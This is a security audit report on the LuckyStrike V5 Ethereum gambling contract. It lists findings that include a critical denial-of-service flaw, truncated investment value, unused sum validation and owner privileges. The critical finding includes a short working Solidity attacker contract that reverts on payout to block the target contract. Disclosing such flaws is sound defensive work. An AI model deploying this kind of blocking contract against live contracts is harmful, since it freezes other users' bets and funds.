# LuckyStrike V5 Security Audit Report

# 1. Summary

[LuckyStrike V5](https://lucky-strike.io/game/) smart contract security audit report performed by [Callisto Security Audit Department](https://github.com/EthereumCommonwealth/Auditing)

> Lucky Strike, based fully in Ethereum smart-contract, is bringing the core philosophy of blockchain to the gambling industry – enhancing it with an ICO model we’re calling ‘Bet & Own.’

https://lucky-strike.io/game/#/

# 2. In scope

1. [LuckyStrike](https://ropsten.etherscan.io/address/0x1a77110391c07d3d67c8c55c6114a858cb45bb26#contracts)
2. [LuckyStrikeTokens](https://ropsten.etherscan.io/address/0xc3e2b080aefc0d9d5b5e30614e892b5fd1276777#contracts)

# 3. Findings

In total, **5 issues** were reported including:

- 1 Critical severity issues.

- 1 medium severity issues.

- 1 low severity issues.

- 1 notes.

- 1 owner privileges (the ability of an owner to manipulate contract, may be risky for investors).

## 3.1. An attacker can block the contract

### Severity: critical

### Description

In current version the draw takes place by queue and each bet is played out one by one. In case of victory, the winner is paid a reward by `transfer` function. The peculiarity of this function is that in the case of `throw` on the recipient's side the entire transaction will be rollback. `throw` can be done intentionally by an attacker, if the recipient is another smart contract. Thus, the attacker can block the entire contract, making it impossible to place bets and draws.

Simple example of an Attackers contract:

```Solidity
contract Attacker {
    LuckyStrike public ls = LuckyStrike(address(0x1A77110391C07D3d67c8c55C6114A858cB45BB26));
    bool public blockMode = true;
    
    function turnBlockModeOn() public {
        blockMode = true;
    }
    
    function turnBlockModeOff() public {
        blockMode = false;
    }
    
    function () payable external {
        if(blockMode) {
            revert(); // LuckyStrike blocked;
        }
    }
    
    function bet() public payable {
        ls.placeABet.value(msg.value)();
    }  
}
```

### Code snippet

* [LuckyStrike, lines 1977, 1905](https://ropsten.etherscan.io/address/0x1a77110391c07d3d67c8c55c6114a858cb45bb26#contracts)

## 3.2. Truncated Value (Invest & Play)

### Severity: medium

### Description

Following the answer to this issue, the tokens are said to be like a bonus for the players but the amount to be invested is subtracted from `msg.value` ("bet amount = msg.value - invested amount") when invest and play is called meaning that this issue is still applicable.

Please refer to the [previous audit issue description](https://gist.github.com/RideSolo/67652c80c78194296ae24affd8779db2#31-truncated-value-invest--play) to solve this error.

## 3.3. Sum Validation

### Severity: note

### Description

Inside `allocateSum` member of the game contract contain `sumValidationPassed` variable that is used to check if the allocated sum values are correct however no action is taken following the result of it.

### Code snippet

```
        bool sumValidationPassed = false;
        
        if (
            (jackpotsSumAllocation[1] +
            jackpotsSumAllocation[2] +
            jackpotsSumAllocation[3] +
            jackpotsSumAllocation[4] +
            incomeSum +
            refSum +
            payToWinner) == _sum) {
            sumValidationPassed = true;
        }
```

## 3.4. Owner Privileges

### Severity: owner privileges
 
### Description:

- `adjustAllocation` function allows the owner to reset the rates of the different jackpots and income rate as wished.
- 70M tokens are first distributed by the owner that represent 10500 ether, the token sale hardcap is 4500 ether,  meaning that the developers allow them self more than a third of the total income of the bet game, investors have to be aware of such usage.

### Code snippet

- [Line 1590-1628](https://ropsten.etherscan.io/address/0x1a77110391c07d3d67c8c55c6114a858cb45bb26#contracts)
- [Line 159-162](https://ropsten.etherscan.io/address/0xc3e2b080aefc0d9d5b5e30614e892b5fd1276777)

## 3.5. Known vulnerabilities of ERC-20 token

### Severity: low

### Description

1. It is possible to double withdrawal attack. More details [here](https://docs.google.com/document/d/1YLPtQxZu1UAvO9cZ1O2RPXBbT0mooh4DYKjA_jp-RLM/edit)
2. Lack of transaction handling mechanism issue. [WARNING!](https://gist.github.com/Dexaran/ddb3e89fe64bf2e06ed15fbd5679bd20) This is a very common issue and it already caused millions of dollars losses for lots of token users! More details [here](https://docs.google.com/document/d/1Feh5sP6oQL1-1NHi-X1dbgT3ch2WdhbXRevDN681Jv4/edit)

# 4. Conclusion

The audited smart contract must not be deployed. Reported issues must be fixed prior to the usage of this contract.

# 5. Revealing audit reports

https://gist.github.com/yuriy77k/47f3a778a7febfdbd10fafc3c654d8c7

https://gist.github.com/yuriy77k/e12af0290e90d575e1b59acac31c223f

https://gist.github.com/yuriy77k/46a92b0f3cd3edfb30c71ab57730ebc0
